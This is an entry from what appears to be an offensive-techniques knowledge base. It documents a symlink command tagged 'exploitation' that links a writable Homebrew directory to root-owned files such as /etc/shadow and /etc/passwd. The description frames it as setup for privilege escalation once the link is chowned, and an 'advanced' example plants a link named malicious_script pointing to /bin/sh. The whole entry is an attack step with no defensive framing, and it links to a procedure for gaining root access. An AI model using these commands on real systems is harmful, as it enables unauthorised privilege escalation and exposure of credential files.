---
data: ln -s /target/root/file /opt/homebrew/unprotected/symlink_target
tags:
  - exploitation
  - symlink
type: command
output: null
executor: bash
platforms:
  - macOS
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:10.096Z'
id: 5729df42-669d-488c-a1b4-64c981aec1f0
verified: false
validated: true
submitted: true
---
# create-symlink

## Command

```bash
ln -s /target/root/file /opt/homebrew/unprotected/symlink_target
```

## Description

Creates a symbolic link from a writable Homebrew path to a root-owned target, setting up for privilege escalation when chowned.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Create symbolic link | Yes |
| `/target/root/file` | Target path (e.g., /etc/shadow) | Yes |
| `/opt/homebrew/unprotected/symlink_target` | Link location in Homebrew | Yes |

## Examples

### Basic Usage

```bash
ln -s /etc/passwd /opt/homebrew/symlink
```

### Advanced Usage

```bash
ln -s /bin/sh /opt/homebrew/malicious_script && chmod +x /opt/homebrew/malicious_script
```

## Expected Output

No output on success; verify with ls -l showing lrwxrwxrwx -> /target/root/file.

## Related

- [[Related Procedure|procedures/Exploit-Homebrew-Symlink-for-Root-Access]]
